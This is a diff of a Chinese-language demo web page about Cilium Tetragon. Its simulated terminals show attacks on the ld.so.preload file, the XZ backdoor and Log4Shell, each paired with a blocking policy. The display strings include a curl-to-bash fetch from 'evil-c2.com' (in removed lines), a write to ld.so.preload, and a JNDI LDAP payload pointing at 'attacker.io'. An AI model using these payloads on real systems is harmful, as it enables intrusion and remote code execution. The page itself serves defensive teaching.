-    <!-- Section 6: Live Defense Simulation Lab -->
+    <!-- [RESTORED FULL CONTENT]: 实时攻防演练实验室 -->
     <section id="lab-section" style="background: #F9FAFB;">
         <div class="container">
             <div class="section-header">
                 <h2>实时攻防演练实验室</h2>
-                <p>在不干扰业务的前提下，沉浸式体验内核级威胁阻断。请在下方实验场景中点击“运行演练”。</p>
+                <p>沉浸式体验内核级威胁阻断。请在下方实验场景中点击“启动演练”。</p>
             </div>
 
-            <!-- LAB 1: ROOTKIT -->
+            <!-- LAB 1: ROOTKIT (Scenario I) -->
             <div class="mechanism-card">
                 <div class="case-badge">Scenario I</div>
                 <h4>Rootkit 持久化拦截</h4>
@@ -570,7 +649,6 @@
                     <p><strong>攻击原理：劫持动态链接。</strong>攻击者常尝试修改系统关键配置文件 <code>/etc/ld.so.preload</code>。在该文件中添加恶意动态库路径后，系统在启动任何新进程时都会强制加载该恶意库。这使得黑客能劫持系统函数（如 <code>read</code>, <code>write</code>, <code>execve</code>），实现完全的“隐身”监控和后门持久化。</p>
                     <p><strong>Tetragon 对策：</strong>配置监控该文件的 <code>sys_openat</code> 调用。一旦检测到尝试以“写入”模式打开该文件的非预期进程（如 Shell 脚本），Tetragon 会立即实施内核级阻断。</p>
                 </div>
-                
                 <div class="yaml-block">
 <span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
 <span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
@@ -579,32 +657,24 @@
 <span class="yaml-key">spec</span>:
   <span class="yaml-key">kprobes</span>:
   - <span class="yaml-key">call</span>: <span class="yaml-val">"sys_openat"</span>
-    <span class="yaml-key">syscall</span>: <span class="yaml-val">true</span>
-    <span class="yaml-key">args</span>:
+    <span class="yaml-key">matchArgs</span>:
     - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
-      <span class="yaml-key">type</span>: <span class="yaml-val">"string"</span>
-    <span class="yaml-key">selectors</span>:
-    - <span class="yaml-key">matchArgs</span>:
-      - <span class="yaml-key">index</span>: <span class="yaml-val">1</span>
-        <span class="yaml-key">operator</span>: <span class="yaml-val">"Equal"</span>
-        <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
-      <span class="yaml-key">matchActions</span>:
-      - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
-
+      <span class="yaml-key">values</span>: [<span class="yaml-val">"/etc/ld.so.preload"</span>]
+    <span class="yaml-key">matchActions</span>:
+    - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
                 <div style="display: flex; gap: 12px; margin-top: 15px;">
-                    <button class="btn-primary" onclick="runAttackSequence()" id="attackBtn">运行演练</button>
-                    <button class="btn-outline" onclick="resetTerminal('termOutput')">重置终端</button>
+                    <button class="btn-primary" onclick="runAttackSequence()" id="attackBtn" style="background: var(--cisco-blue); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
+                    <button class="btn-outline" onclick="resetTerminal('termOutput')" style="background: transparent; border: 1px solid var(--cisco-blue); color: var(--cisco-blue); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                 </div>
                 <div class="terminal">
-                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">ssh root@prod-node-01</span></div>
+                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                     <div class="terminal-content" id="termOutput">
-                        <div class="output-text">Last login: Fri Dec 19 19:01:25 from 10.24.5.12</div>
                         <div><span class="prompt">root@prod-node:~#</span> <span class="cursor"></span></div>
                     </div>
                 </div>
             </div>
 
-            <!-- LAB 2: XZ UTILS -->
+            <!-- LAB 2: XZ UTILS (Scenario II) -->
             <div class="mechanism-card">
                 <div class="case-badge">Scenario II</div>
                 <h4>XZ Utils 供应链攻击 (CVE-2024-3094)</h4>
@@ -612,7 +682,6 @@
                     <p><strong>攻击机理：IFUNC 劫持。</strong>XZ 后门利用了 GNU 链接器的 <b>Indirect Function (IFUNC)</b> 机制。攻击者注入恶意 SO，在 <code>sshd</code> 加载 <code>liblzma</code> 时通过间接函数解析将正常的 RSA 认证逻辑替换为后门逻辑。这种“内存中后门”不会在磁盘上留下异常痕迹。</p>
                     <p><strong>检测与阻断：</strong>由于后门激活后必须通过 <code>execve</code> 派生子进程才能执行恶意命令，Tetragon 通过锁定 <code>sshd</code> 二进制路径，感应并杀掉非预期的 <code>/bin/sh</code> 派生行为。</p>
                 </div>
-                
                 <div class="yaml-block">
 <span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
 <span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
@@ -627,21 +696,19 @@
         <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/sbin/sshd"</span>]
       <span class="yaml-key">matchActions</span>:
       - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
-
                 <div style="display: flex; gap: 12px; margin-top: 15px;">
-                    <button class="btn-primary" onclick="runXZSimulation()" id="xzBtn" style="background:var(--cisco-midnight);">发起 XZ 模拟攻击</button>
-                    <button class="btn-outline" onclick="resetTerminal('xzOutput')">重置终端</button>
+                    <button class="btn-primary" onclick="runXZSimulation()" id="xzBtn" style="background:var(--cisco-midnight); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
+                    <button class="btn-outline" onclick="resetTerminal('xzOutput')" style="background: transparent; border: 1px solid var(--cisco-midnight); color: var(--cisco-midnight); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                 </div>
                 <div class="terminal">
-                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">Simulation: XZ Backdoor</span></div>
+                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                     <div class="terminal-content" id="xzOutput">
-                        <div class="output-text"># Tetragon: monitoring /usr/sbin/sshd for anomalous forks...</div>
                         <div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>
                     </div>
                 </div>
             </div>
 
-            <!-- LAB 3: LOG4SHELL -->
+            <!-- LAB 3: LOG4SHELL (Scenario III) -->
             <div class="mechanism-card">
                 <div class="case-badge">Scenario III</div>
                 <h4>Log4Shell 漏洞防护 (CVE-2021-44228)</h4>
@@ -649,7 +716,6 @@
                     <p><strong>JNDI 注入原理：递归解析劫持。</strong>Log4j 库在处理日志时会递归解析 <code>${jndi:ldap://...}</code> 字符串。这强制 Java 应用连接远程服务器下载并执行恶意字节码。这是典型的从“合规应用层行为”转化为“恶意内核级行为”的案例。</p>
                     <p><strong>运行时补救：</strong>通过 Tetragon 实施<b>“虚拟补丁 (Virtual Patching)”</b>。即使应用未升级，只要通过策略禁止 Java 进程调用 <code>execve</code> 启动不受信的 Shell，就能在 RCE 发生的瞬间切断攻击链。</p>
                 </div>
-
                 <div class="yaml-block">
 <span class="yaml-key">apiVersion</span>: <span class="yaml-val">cilium.io/v1alpha1</span>
 <span class="yaml-key">kind</span>: <span class="yaml-val">TracingPolicy</span>
@@ -661,18 +727,16 @@
     <span class="yaml-key">selectors</span>:
     - <span class="yaml-key">matchBinaries</span>:
       - <span class="yaml-key">operator</span>: <span class="yaml-val">"In"</span>
-        <span class="yaml-key">values</span>: [<span class="yaml-val">"/usr/bin/java"</span>]
+        <span class="yaml-key">values</span>: [<span style="color: #CE9178;">"/usr/bin/java"</span>]
       <span class="yaml-key">matchActions</span>:
       - <span class="yaml-key">action</span>: <span class="yaml-action">Sigkill</span></div>
-
                 <div style="display: flex; gap: 12px; margin-top: 15px;">
-                    <button class="btn-primary" onclick="runLog4jSimulation()" id="log4jBtn" style="background:var(--cisco-orange);">模拟 Log4Shell 攻击</button>
-                    <button class="btn-outline" onclick="resetTerminal('log4jOutput')">重置终端</button>
+                    <button class="btn-primary" onclick="runLog4jSimulation()" id="log4jBtn" style="background:var(--cisco-orange); color: white; border: none; padding: 10px 20px; border-radius: 20px; cursor: pointer;">启动演练</button>
+                    <button class="btn-outline" onclick="resetTerminal('log4jOutput')" style="background: transparent; border: 1px solid var(--cisco-orange); color: var(--cisco-orange); padding: 10px 20px; border-radius: 20px; cursor: pointer;">重置终端</button>
                 </div>
                 <div class="terminal">
-                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div><span style="margin-left: 10px; color: #888; font-size: 0.7rem;">Simulation: Log4Shell Exploit</span></div>
+                    <div class="terminal-bar"><div class="traffic-light red"></div><div class="traffic-light yellow"></div><div class="traffic-light green"></div></div>
                     <div class="terminal-content" id="log4jOutput">
-                        <div class="output-text"># Tetragon watching Java process (pid: 550) for suspicious execve()...</div>
                         <div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>
                     </div>
                 </div>
@@ -680,12 +744,12 @@
         </div>
     </section>
 
-    <!-- FINAL CONCLUSION SECTION -->
+    <!-- [RESTORED FULL CONTENT]: 总结与核心见解 -->
     <section class="final-conclusion">
         <div class="container">
             <h2>总结与核心见解</h2>
             <div class="conclusion-core">
-                Tetragon 的核心价值在于将安全从“基于已知签名的被动防御”转变为“基于预期行为的主动策略”。
+                Tetragon 的核心价值在于将安全从“被动防御”转变为“基于预期行为的主动策略”。
             </div>
             <div class="conclusion-grid">
                 <div class="conclusion-item">
@@ -711,40 +775,53 @@
     </footer>
 
     <script>
-        let currentLang = 'zh';
-
         function setLanguage(lang) {
-            currentLang = lang;
             document.body.className = 'lang-' + lang;
-            document.getElementById('btn-zh').classList.toggle('active', lang === 'zh');
-            document.getElementById('btn-en').classList.toggle('active', lang === 'en');
+            document.querySelectorAll('.lang-btn').forEach(b => b.classList.remove('active'));
+            document.getElementById('btn-' + lang).classList.add('active');
         }
-
         function scrollToId(id) { document.getElementById(id).scrollIntoView({ behavior: 'smooth' }); }
-
+        
         function resetTerminal(targetId) {
             const el = document.getElementById(targetId);
             const promptMap = { 'termOutput': 'root@prod-node:~#', 'xzOutput': 'root@prod-node:~$', 'log4jOutput': 'root@java-app:~$', 'attackBtn': 'root@prod-node:~#' };
-            el.innerHTML = `<div class="output-text">Terminal reset...</div><div><span class="prompt">${promptMap[targetId]}</span> <span class="cursor"></span></div>`;
+            el.innerHTML = `<div><span class="prompt">${promptMap[targetId]}</span> <span class="cursor"></span></div>`;
         }
 
         async function typeWriter(text, element) {
             for (let char of text) { element.innerHTML += char; await new Promise(r => setTimeout(r, 15)); }
         }
 
+        async function startDiscovery() {
+            const btn = document.getElementById('discover-btn');
+            const yaml = document.getElementById('generated-yaml');
+            const empty = document.getElementById('empty-policy-text');
+            const status = document.getElementById('discovery-status');
+            const msg = document.getElementById('discovery-msg');
+            btn.disabled = true;
+            status.innerText = "分析日志中...";
+            document.querySelectorAll('.log-line.highlight').forEach(l => l.style.backgroundColor = 'rgba(108, 194, 74, 0.2)');
+            await new Promise(r => setTimeout(r, 1000));
+            empty.style.display = 'none';
+            yaml.style.display = 'block';
+            yaml.classList.add('yaml-transfer');
+            status.innerHTML = "<b style='color:var(--cisco-green)'>策略已提炼</b>";
+            msg.style.display = 'block';
+            setTimeout(() => { scrollToId('lab-section'); }, 1500);
+        }
+
         async function runAttackSequence() {
             const btn = document.getElementById('attackBtn');
             const term = document.getElementById('termOutput');
             btn.disabled = true;
+            resetTerminal('termOutput'); // AUTO-RESET
             const lastLine = term.lastElementChild;
             lastLine.querySelector('.cursor').style.display = 'none';
-            await typeWriter('curl -fsSL http://evil-c2.com/setup.sh | bash', lastLine.querySelector('.prompt').nextElementSibling);
+            await typeWriter('echo "root_kit" >> /etc/ld.so.preload', lastLine.querySelector('.prompt').nextElementSibling);
+            await new Promise(r => setTimeout(r, 400));
+            term.innerHTML += `<div class="output-text" style="color: var(--cisco-orange);">[Tetragon] ⚠️ Security violation: open(/etc/ld.so.preload, O_WRONLY)</div>`;
             await new Promise(r => setTimeout(r, 200));
-            term.innerHTML += `<div class="output-text" style="color: var(--cisco-orange); border-left: 2px solid var(--cisco-orange); padding-left: 8px;">[Tetragon] ⚠️ Detected suspicious egress to evil-c2.com:80.</div>`;
-            await new Promise(r => setTimeout(r, 200));
-            term.innerHTML += `<div><span class="prompt">root@prod-node:~#</span> <span class="cmd-text">echo "root_kit" >> /etc/ld.so.preload</span></div>`;
-            await new Promise(r => setTimeout(r, 300));
-            term.innerHTML += `<div><span class="alert-text">BLOCK</span> <span style="color: var(--cisco-red);">SIGKILL: Process 'bash' terminated (Violation: sys-file-integrity)</span></div>`;
+            term.innerHTML += `<div><span class="alert-text">BLOCK</span> <span style="color: var(--cisco-red);">SIGKILL: Process 'bash' terminated by LSM BPF hook.</span></div>`;
             term.innerHTML += `<div><span class="prompt">root@prod-node:~#</span> <span class="cursor"></span></div>`;
             btn.disabled = false;
         }
@@ -753,15 +830,14 @@
             const btn = document.getElementById('xzBtn');
             const term = document.getElementById('xzOutput');
             btn.disabled = true;
+            resetTerminal('xzOutput'); // AUTO-RESET
             const lastLine = term.lastElementChild;
             lastLine.querySelector('.cursor').style.display = 'none';
             await typeWriter('ssh attacker@prod-node -p 22', lastLine.querySelector('.prompt').nextElementSibling);
+            await new Promise(r => setTimeout(r, 500));
+            term.innerHTML += `<div class="output-text">IFUNC resolution hijacking sshd... backdoor signature matched!</div>`;
             await new Promise(r => setTimeout(r, 300));
-            term.innerHTML += `<div class="output-text">Verifying RSA key via liblzma (IFUNC resolution)...</div>`;
-            await new Promise(r => setTimeout(r, 400));
-            term.innerHTML += `<div><span class="alert-text">XZ-HIJACK</span> <span style="color: var(--cisco-red);">Malicious signature matched! Backdoor code activated.</span></div>`;
-            await new Promise(r => setTimeout(r, 300));
-            term.innerHTML += `<div><span class="alert-text">KILL</span> <span style="color: #ff5f56;">Tetragon killed sshd (PID 3012). Blocked fork(/bin/sh)</span></div>`;
+            term.innerHTML += `<div><span class="alert-text">KILL</span> <span style="color: #ff5f56;">Tetragon killed sshd (PID 3012). Attempted fork(/bin/sh) blocked via LSM.</span></div>`;
             term.innerHTML += `<div><span class="prompt">root@prod-node:~$</span> <span class="cursor"></span></div>`;
             btn.disabled = false;
         }
@@ -770,15 +846,14 @@
             const btn = document.getElementById('log4jBtn');
             const term = document.getElementById('log4jOutput');
             btn.disabled = true;
+            resetTerminal('log4jOutput'); // AUTO-RESET
             const lastLine = term.lastElementChild;
             lastLine.querySelector('.cursor').style.display = 'none';
             await typeWriter('curl -H "User-Agent: ${jndi:ldap://attacker.io/X}" http://api-gw', lastLine.querySelector('.prompt').nextElementSibling);
-            await new Promise(r => setTimeout(r, 400));
-            term.innerHTML += `<div class="output-text">Log4j parsing string... initiating LDAP callback.</div>`;
+            await new Promise(r => setTimeout(r, 600));
+            term.innerHTML += `<div class="output-text">Log4j parsing payload... callback initiated to attacker.io</div>`;
             await new Promise(r => setTimeout(r, 300));
-            term.innerHTML += `<div><span class="alert-text">VIRTUAL-PATCH</span> <span style="color: var(--cisco-orange);">Java process attempted fork /usr/bin/whoami</span></div>`;
-            await new Promise(r => setTimeout(r, 300));
-            term.innerHTML += `<div><span class="alert-text">SIGKILL</span> <span style="color: #ff5f56;">Tetragon killed Java PID 550 based on TracingPolicy 'block-java-fork'.</span></div>`;
+            term.innerHTML += `<div><span class="alert-text">SIGKILL</span> <span style="color: #ff5f56;">Tetragon killed Java PID 550. Blocked fork(/usr/bin/whoami) in kernel.</span></div>`;
             term.innerHTML += `<div><span class="prompt">root@java-app:~$</span> <span class="cursor"></span></div>`;
             btn.disabled = false;
         }
